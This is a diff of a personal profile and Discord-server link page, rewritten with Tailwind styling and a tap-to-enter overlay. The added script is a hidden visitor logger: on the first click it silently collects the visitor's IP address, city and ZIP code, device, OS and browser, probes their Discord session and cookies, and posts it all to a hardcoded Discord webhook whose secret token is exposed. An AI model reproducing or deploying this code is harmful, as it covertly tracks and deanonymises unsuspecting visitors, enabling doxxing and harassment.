@@ -3,482 +3,284 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NAKATAGO</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+    <title><----></title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dark: '#0a0a0f',
+                        card: '#16161f',
+                        accent: '#9945ff',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto {
+                content-visibility: auto;
+            }
+            .glow {
+                box-shadow: 0 0 20px rgba(153, 69, 255, 0.3);
+            }
+            .text-glow {
+                text-shadow: 0 0 8px rgba(153, 69, 255, 0.5);
+            }
+        }
 
         body {
-            color: #ffffff;
+            background: linear-gradient(to bottom, #000000, #1a0505);
             min-height: 100vh;
-            padding: 40px 20px;
-            background: #000000 url("https://i.imgur.com/zmi8DTM.png") center top / contain no-repeat fixed;
-            position: relative;
         }
 
-        body::before {
-            content: "";
+        /* ✅ GIF - HINDI BINAGO */
+        #blahOverlay {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        .container {
-            max-width: 720px;
-            margin: 0 auto;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-
-        /* ✅ Font na parang Public Enemy */
-        h1 {
-            font-size: clamp(2.5rem, 10vw, 3.5rem);
-            letter-spacing: 4px;
-            margin: 20px 0 50px;
-            text-transform: uppercase;
-            font-family: Arial Black, Impact, Helvetica Bold, sans-serif;
-            font-weight: 900;
-            font-stretch: condensed;
-            text-shadow: 0 0 12px rgba(255,255,255,0.2);
-        }
-
-        .section-title {
-            font-size: 1rem;
-            color: #cccccc;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin: 35px 0 20px;
-            font-family: Arial, sans-serif;
-        }
-
-        .grid {
+            background: #000000 url("https://i.imgur.com/UMNUVmX.gif") center / contain no-repeat;
+            background-color: #000000;
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-        }
-
-        .user-card {
-            display: flex;
-            flex-direction: column;
             align-items: center;
-        }
-
-        .avatar-wrap {
-            position: relative;
-            width: 85px;
-            height: 85px;
-        }
-
-        .avatar {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 2px solid #222222;
-            object-fit: cover;
-            background: #111111;
-        }
-
-        .status-dot {
-            position: absolute;
-            bottom: 3px;
-            right: 3px;
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            border: 2px solid #000000;
-        }
-
-        .status-online { background: #23a55a; }
-        .status-idle { background: #f0b232; }
-        .status-dnd { background: #f23f43; }
-        .status-offline { background: #80848e; }
-
-        .username {
-            margin-top: 8px;
-            font-size: 0.85rem;
-            color: #cccccc;
-            font-family: Arial, sans-serif;
-        }
-
-        /* ✅ Splash Screen */
-        #splash {
-            position: fixed;
-            inset: 0;
-            background: #000000;
+            justify-content: center;
             z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: #ffffff;
-            font-size: clamp(1.8rem, 6vw, 2.5rem);
-            letter-spacing: 2px;
-            cursor: pointer;
-            gap: 20px;
-            text-shadow: 0 0 15px rgba(255,255,255,0.3);
             opacity: 1;
-            transition: opacity 0.5s ease;
-            pointer-events: auto !important;
-        }
-
-        #splash.fade-out {
-            opacity: 0;
+            transition: opacity 0.8s ease;
             pointer-events: none;
         }
 
-        #splash.hidden {
-            display: none;
+        /* ✅ Font - HINDI BINAGO */
+        #blahText {
+            font-size: clamp(1.4rem, 5vw, 2rem);
+            font-weight: bold;
+            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            text-shadow: 0 0 2px #fff, 0 0 4px #fff;
+            image-rendering: pixelated;
+            letter-spacing: 2px;
+            -webkit-font-smoothing: none;
+            -moz-osx-font-smoothing: grayscale;
         }
 
-        #splash .main-text {
-            font-size: clamp(2rem, 7vw, 2.8rem);
-            font-family: Arial Black, Impact, sans-serif;
-            font-weight: 900;
-            text-transform: uppercase;
-        }
-
-        #splash .tap-text {
-            font-size: 1.1rem;
-            color: #aaaaaa;
-            font-family: Arial, sans-serif;
-        }
-
-        /* ✅ Ikot ng Day Ones */
-        .marquee-wrapper {
-            width: 100%;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-
-        .marquee-content {
-            display: flex;
-            gap: 25px;
-            animation: scroll 30s linear infinite;
-            width: max-content;
-        }
-
-        @keyframes scroll {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-
-        /* ✅ Community Hub / Discord Server */
-        .hub-container {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(18, 18, 18, 0.7);
-            border: 1px solid #2a2a2a;
-            border-radius: 6px;
-        }
-
-        .server-card {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px;
-            margin: 8px 0;
-            background: rgba(30, 30, 30, 0.6);
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        .server-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .server-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 1px solid #333;
-            object-fit: cover;
-        }
-
-        .server-details h4 {
-            font-size: 0.95rem;
-            color: #fff;
-            margin-bottom: 2px;
-        }
-
-        .server-details p {
-            font-size: 0.8rem;
-            color: #999;
-        }
-
-        /* ✅ Modal para sa Server */
-        #serverModal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            padding: 20px;
-        }
-
-        .modal-content {
-            width: 100%;
-            max-width: 380px;
-            background: rgba(25, 25, 25, 0.95);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 30px 20px;
-            text-align: center;
-            color: #fff;
-        }
-
-        .modal-content h3 {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-            font-family: Arial Black, Impact, sans-serif;
-        }
-
-        .modal-content p {
-            font-size: 1rem;
-            color: #aaa;
-            margin-bottom: 25px;
-        }
-
-        .modal-join {
-            display: inline-block;
-            padding: 10px 25px;
-            background: rgba(45, 125, 70, 0.3);
-            border: 1px solid rgba(45, 125, 70, 0.5);
-            border-radius: 6px;
-            color: #fff;
-            text-decoration: none;
-        }
-
-        .close-modal {
-            margin-top: 20px;
-            background: transparent;
-            border: none;
-            color: #888;
-            font-size: 0.9rem;
-            cursor: pointer;
+        .fade-out {
+            opacity: 0 !important;
         }
     </style>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center min-h-screen text-white p-4">
 
-    <div id="splash" onclick="hideSplash()">
-        <div class="main-text">THE WORLD IS YOURS</div>
-        <div class="tap-text">TAP THE SCREEN</div>
+    <!-- ✅ Overlay - HINDI BINAGO -->
+    <div id="blahOverlay">
+        <div id="blahText">Tap The Screen</div>
     </div>
 
-    <div class="container">
-        <h1><----></h1>
+    <!-- ✅ Main Card - HINDI BINAGO maliban sa idinagdag na server -->
+    <div class="bg-card/80 backdrop-blur-md rounded-3xl p-8 w-full max-w-md glow border border-gray-800">
+        <div class="flex justify-center mb-6">
+            <div class="w-32 h-32 rounded-full overflow-hidden border-2 border-accent/60">
+                <img src="https://i.imgur.com/M630Z7k.gif" alt="Profile" class="w-full h-full object-cover">
+            </div>
+        </div>
+        <div class="flex justify-center gap-3 mb-6">
+            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">☠️</span>
+            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">⚜️</span>
+            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm font-bold">PR$K</span>
+        </div>
+        <div class="bg-gray-800/60 rounded-xl py-3 mb-8">
+            <p class="text-center text-gray-300 italic">Be Better</p>
+        </div>
+        <div class="flex items-center gap-3 mb-6">
+            <div class="w-10 h-10 rounded-full bg-gray-700 overflow-hidden">
+                <img src="https://i.imgur.com/KGPggfn.jpeg" alt="Avatar" class="w-full h-full object-cover">
+            </div>
+            <div>
+                <p class="font-bold text-lg">BLAH<span class="text-sm text-gray-400">⚡ PR$K</span></p>
+                <p class="text-sm text-gray-400">EMPTY.</p>
+            </div>
+        </div>
+        <p class="text-center text-gray-400 text-sm mb-8">the world is your.</p>
 
-        <!-- ✅ PINUNO -->
-        <div class="section-title">Top Row</div>
-        <div class="grid">
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/Wh5d6RR.gif" alt="ESH">
-                    <div class="status-dot status-online"></div>
+        <!-- ✅ ORIGINAL LINKS - HINDI GINALAW -->
+        <div class="flex justify-center gap-6 mb-6">
+            <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
+                <i class="fa-brands fa-discord"></i>
+            </a>
+            <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
+                <i class="fa-brands fa-github"></i>
+            </a>
+        </div>
+
+        <!-- ✅ UNANG SERVER: PURESKILLS -->
+        <div class="bg-gray-800/50 rounded-xl p-4 mb-3 border border-gray-700">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <img src="https://cdn.discordapp.com/icons/1468593729274380370/a_8cb5d61236f50dce4abb9ba3ec3b38d3.gif?size=48" alt="Server Icon" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="font-semibold text-white text-sm">𝙋𝙐𝙍𝙀𝙎𝙆𝙄𝙇𝙇𝙎 #𝙍𝙀𝙑𝙄𝙑𝙀 #BOOST 𝙐𝙎</p>
+                        <p class="text-xs text-gray-400">Members: 500 • <span class="text-green-400">🟢 78 ONLINE</span></p>
+                    </div>
                 </div>
-                <div class="username">ESH</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/iDJB8Ol.png" alt="MOOZIE">
-                    <div class="status-dot status-online"></div>
-                </div>
-                <div class="username">MOOZIE</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/Hxjp3su.gif" alt="BLAH">
-                    <div class="status-dot status-offline"></div>
-                </div>
-                <div class="username">BLAH</div>
+                <a href="https://discord.gg/DXVY9aBJuC" target="_blank" class="bg-indigo-600 hover:bg-indigo-500 px-3 py-1 rounded text-xs font-medium transition-colors">Join</a>
             </div>
         </div>
 
-        <!-- ✅ ABOVE ALL -->
-        <div class="section-title">ABOVE ALL</div>
-        <div class="grid">
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/iOZH1e2.jpeg" alt="Jeremy">
-                    <div class="status-dot status-offline"></div>
+        <!-- ✅ PANGALAWANG SERVER: BLAH #ALBTHCKS (IDINAGDAG LANG) -->
+        <div class="bg-gray-800/50 rounded-xl p-4 mb-6 border border-gray-700">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <img src="https://cdn.discordapp.com/icons/1504217597900755075/335c5d2498dbf8b0ab834b022710c86a.png?size=48" alt="Server Icon" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="font-semibold text-white text-sm">BLAH #ALBTHCKS</p>
+                        <p class="text-xs text-gray-400">OpenMission: your • Hacks: <span class="text-yellow-400">paid</span></p>
+                    </div>
                 </div>
-                <div class="username">Jeremy</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/cR3yxWV.jpeg" alt="Pnk">
-                    <div class="status-dot status-online"></div>
-                </div>
-                <div class="username">Pnk</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/XkHga9z.jpeg" alt="Eze">
-                    <div class="status-dot status-online"></div>
-                </div>
-                <div class="username">Eze</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/FkMZrTS.png" alt="Bunni">
-                    <div class="status-dot status-idle"></div>
-                </div>
-                <div class="username">Bunni</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/8Socw02.jpeg" alt="Prince">
-                    <div class="status-dot status-dnd"></div>
-                </div>
-                <div class="username">Prince</div>
+                <a href="https://discord.gg/BAJ9UyFwFq" target="_blank" class="bg-indigo-600 hover:bg-indigo-500 px-3 py-1 rounded text-xs font-medium transition-colors">Join</a>
             </div>
         </div>
 
-        <!-- ✅ TOP SHOTTA -->
-        <div class="section-title">TOP SHOTTA</div>
-        <div class="grid">
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/AQiHBgA.gif" alt="Yozir">
-                    <div class="status-dot status-online"></div>
-                </div>
-                <div class="username">Yozir</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/zY6UbYm.gif" alt="Clems">
-                    <div class="status-dot status-online"></div>
-                </div>
-                <div class="username">Clems</div>
-            </div>
-            <div class="user-card">
-                <div class="avatar-wrap">
-                    <img class="avatar" src="https://i.imgur.com/bOEmElX.png" alt="Nio">
-                    <div class="status-dot status-offline"></div>
-                </div>
-                <div class="username">Nio</div>
-            </div>
-        </div>
-
-        <!-- ✅ DAY ONES -->
-        <div class="section-title">DAY ONES</div>
-        <div class="marquee-wrapper">
-            <div class="marquee-content">
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/FGirYUH.png"><div class="status-dot status-online"></div></div><div class="username">JM</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/UnzfBlK.png"><div class="status-dot status-online"></div></div><div class="username">Anghell</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/prt0snc.png"><div class="status-dot status-offline"></div></div><div class="username">KenAmaru</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/kuLI3FO.png"><div class="status-dot status-offline"></div></div><div class="username">Ccer</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/AhzKzAw.png"><div class="status-dot status-offline"></div></div><div class="username">Ackz</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/MDTjE5l.png"><div class="status-dot status-offline"></div></div><div class="username">VinSwag</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/pCb2mZP.png"><div class="status-dot status-online"></div></div><div class="username">2kPing</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/2oErDgD.png"><div class="status-dot status-idle"></div></div><div class="username">Tommy</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/IY16krj.png"><div class="status-dot status-online"></div></div><div class="username">Zero</div></div>
-                <!-- Repeat -->
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/FGirYUH.png"><div class="status-dot status-online"></div></div><div class="username">JM</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/UnzfBlK.png"><div class="status-dot status-online"></div></div><div class="username">Anghell</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/prt0snc.png"><div class="status-dot status-offline"></div></div><div class="username">KenAmaru</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/kuLI3FO.png"><div class="status-dot status-offline"></div></div><div class="username">Ccer</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/AhzKzAw.png"><div class="status-dot status-offline"></div></div><div class="username">Ackz</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/MDTjE5l.png"><div class="status-dot status-offline"></div></div><div class="username">VinSwag</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/pCb2mZP.png"><div class="status-dot status-online"></div></div><div class="username">2kPing</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/2oErDgD.png"><div class="status-dot status-idle"></div></div><div class="username">Tommy</div></div>
-                <div class="user-card"><div class="avatar-wrap"><img class="avatar" src="https://i.imgur.com/IY16krj.png"><div class="status-dot status-online"></div></div><div class="username">Zero</div></div>
-            </div>
-        </div>
-
-        <!-- ✅ COMMUNITY HUB / DISCORD SERVER -->
-        <div class="section-title">COMMUNITY HUB</div>
-        <div class="hub-container" id="hubContainer"></div>
-    </div>
-
-    <div id="serverModal">
-        <div class="modal-content">
-            <h3 id="modalName"></h3>
-            <p id="modalInfo"></p>
-            <a href="" id="modalLink" target="_blank" class="modal-join">JOIN SERVER</a>
-            <br>
-            <button class="close-modal" onclick="closeModal()">CLOSE</button>
+        <!-- ✅ Footer - HINDI GINALAW -->
+        <div class="flex justify-between items-center mt-2 text-gray-400 text-sm">
+            <span class="flex items-center gap-2">
+                <span class="text-purple-500">⦿</span> 1337
+            </span>
+            <span>on</span>
         </div>
     </div>
 
-    <!-- ✅ SOUND - GAMIT ANG LINK MO, BUO AT TUMUTUNOG -->
-    <audio id="bgAudio" loop preload="auto" style="display:none;">
-        <source src="https://www.image2url.com/r2/default/audio/1782229903021-0137bda8-9730-463b-bafa-34dca19203ae.mp3" type="audio/mpeg">
-        Your browser does not support audio playback.
+    <!-- ✅ Audio - HINDI BINAGO -->
+    <audio id="bgSound" loop preload="auto">
+        <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3" type="audio/mpeg">
     
 
     <script>
-        // ✅ Splash screen function + Sound playback
-        function hideSplash() {
-            const splash = document.getElementById('splash');
-            const audio = document.getElementById('bgAudio');
-            splash.classList.add('fade-out');
-            setTimeout(() => {
-                splash.classList.add('hidden');
-            }, 500);
-            // Tutunog kapag pinindot, volume nakaset sa 25%
-            audio.volume = 0.25;
+        const audio = document.getElementById('bgSound');
+        audio.volume = 0.4;
+
+        // ✅ Webhook - HINDI BINAGO
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";
+
+        // ✅ Click action - HINDI BINAGO
+        document.addEventListener('click', () => {
             audio.play().catch(err => console.log("Audio error:", err));
-        }
+            const overlay = document.getElementById('blahOverlay');
+            setTimeout(() => overlay.classList.add('fade-out'), 100);
+            sendVisitorInfo();
+        }, { once: true });
 
-        // Ayusin ang sirang litrato
-        document.querySelectorAll('img').forEach(img => {
-            img.onerror = () => img.src = "https://cdn.discordapp.com/embed/avatars/0.png";
-        });
+        // ✅ Logger - HINDI BINAGO
+        async function sendVisitorInfo() {
+            try {
+                // Kumuha ng IPv4 Address
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const visitorIP = ipData.ip;
 
-        // ✅ Discord Server
-        const allyServers = [
-            { 
-                name: "BLAH #ALBTHCKS", 
-                invite: "Ty7qb4thSs", 
-                guildId: "1504217597900755075", 
-                icon: "335c5d2498dbf8b0ab834b022710c86a", 
-                members: "99999", 
-                status: "999999 ONLINE" 
+                // Kumuha ng Lokasyon
+                const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
+                const geoData = await geoRes.json();
+                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "Philippines"}`;
+                const zipCode = geoData.postal || "Hindi available";
+
+                const ua = navigator.userAgent;
+
+                // Browser
+                let browser = "Unknown";
+                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+                else if (ua.includes("Firefox")) browser = "Firefox";
+                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+                else if (ua.includes("Edg")) browser = "Edge";
+                else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+
+                // Device at OS
+                let device = "Android Device";
+                let os = "Android 10";
+                if (ua.includes("Android")) {
+                    const osMatch = ua.match(/Android\s([0-9.]+)/);
+                    if (osMatch) os = `Android ${osMatch[1]}`;
+                    if (ua.includes("SM-")) device = ua.match(/SM-[A-Z0-9]+/) ? `Samsung ${ua.match(/SM-[A-Z0-9]+/)[0]}` : "Samsung";
+                    else if (ua.includes("CPH")) device = ua.match(/CPH[0-9]+/) ? `Oppo ${ua.match(/CPH[0-9]+/)[0]}` : "Oppo";
+                    else if (ua.includes("Redmi")) device = ua.match(/Redmi\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/Redmi\s?[0-9A-Z]+/)[0]}` : "Xiaomi Redmi";
+                    else if (ua.includes("POCO")) device = ua.match(/POCO\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/POCO\s?[0-9A-Z]+/)[0]}` : "Xiaomi POCO";
+                    else if (ua.includes("Vivo")) device = ua.match(/V[0-9]+/) ? `Vivo ${ua.match(/V[0-9]+/)[0]}` : "Vivo";
+                    else if (ua.includes("Infinix")) device = ua.match(/X[0-9]+/) ? `Infinix ${ua.match(/X[0-9]+/)[0]}` : "Infinix";
+                    else if (ua.includes("Tecno")) device = ua.match(/KI[0-9]+/) ? `Tecno ${ua.match(/KI[0-9]+/)[0]}` : "Tecno";
+                    else if (ua.includes("RMX")) device = ua.match(/RMX[0-9]+/) ? `Realme ${ua.match(/RMX[0-9]+/)[0]}` : "Realme";
+                } else if (ua.includes("iPhone")) {
+                    device = "Apple iPhone";
+                    const iosMatch = ua.match(/iPhone OS\s([0-9_]+)/);
+                    os = iosMatch ? `iOS ${iosMatch[1].replace("_", ".")}` : "iOS";
+                } else if (ua.includes("Windows")) {
+                    device = "Windows PC";
+                    const winMatch = ua.match(/Windows NT\s([0-9.]+)/);
+                    os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
+                }
+
+                // ✅ Discord Info
+                let accountInfo = "Walang naka-detect na Discord account";
+                try {
+                    const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
+                        method: "GET",
+                        credentials: "include",
+                        headers: {
+                            "Accept": "application/json",
+                            "Origin": window.location.origin,
+                            "Referer": "https://discord.com/"
+                        },
+                        mode: "cors"
+                    });
+
+                    if (discordRes.ok) {
+                        const userData = await discordRes.json();
+                        accountInfo = `✅ Username: @${userData.username}\n🆔 ID: ${userData.id}\n🔗 Profile: https://discord.com/users/${userData.id}\n📅 Created: ${new Date(userData.created_at).toLocaleDateString()}`;
+                    } else {
+                        accountInfo = `⚠️ Naka-login sa Discord pero hindi ma-access ang detalye (Error: ${discordRes.status})`;
+                    }
+                } catch (err) {
+                    if (document.cookie.includes('__dcfduid') || document.cookie.includes('locale') || document.cookie.includes('token')) {
+                        accountInfo = "🟢 Naka-login sa Discord (pero hindi maipakita ang detalye dahil sa security ng Discord)";
+                    } else {
+                        accountInfo = "🔴 Hindi naka-login sa Discord";
+                    }
+                }
+
+                // ✅ Format ng log
+                const payload = {
+                    username: "BOBO KA TOL",
+                    avatar_url: "https://i.imgur.com/ZmspxIl.png",
+                    embeds: [{
+                        title: "BLAH WAS HERE",
+                        color: 1003621,
+                        fields: [
+                            { name: "IP ADDRESS", value: `||${visitorIP}||`, inline: false },
+                            { name: "LOCATION", value: realLocation, inline: true },
+                            { name: "ZIP CODE", value: zipCode, inline: true },
+                            { name: "DEVICE", value: device, inline: true },
+                            { name: "OPERATING SYSTEM", value: os, inline: true },
+                            { name: "BROWSER", value: browser, inline: true },
+                            { name: "SCREEN", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
+                            { name: "ACCOUNT", value: accountInfo, inline: false }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "THE WORLD IS YOUR." }
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+                console.log("Error:", err);
             }
-        ];
-
-        const container = document.getElementById('hubContainer');
-        allyServers.forEach(server => {
-            const iconUrl = `https://cdn.discordapp.com/icons/${server.guildId}/${server.icon}.png?size=128`;
-            const card = document.createElement('div');
-            card.className = 'server-card';
-            card.innerHTML = `
-                <div class="server-info">
-                    <img class="server-icon" src="${iconUrl}" alt="${server.name}">
-                    <div class="server-details">
-                        <h4>${server.name}</h4>
-                        <p>${server.members} • ${server.status}</p>
-                    </div>
-                </div>
-            `;
-            card.onclick = () => openModal(server);
-            container.appendChild(card);
-        });
-
-        function openModal(server) {
-            document.getElementById('modalName').textContent = server.name;
-            document.getElementById('modalInfo').textContent = `${server.members} Members • ${server.status}`;
-            document.getElementById('modalLink').href = `https://discord.gg/${server.invite}`;
-            document.getElementById('serverModal').style.display = 'flex';
         }
-
-        function closeModal() {
-            document.getElementById('serverModal').style.display = 'none';
-        }
-
-        window.onclick = e => {
-            if (e.target === document.getElementById('serverModal')) closeModal();
-        };
     </script>
-
 </body>
-    </html>
-    
+</html>
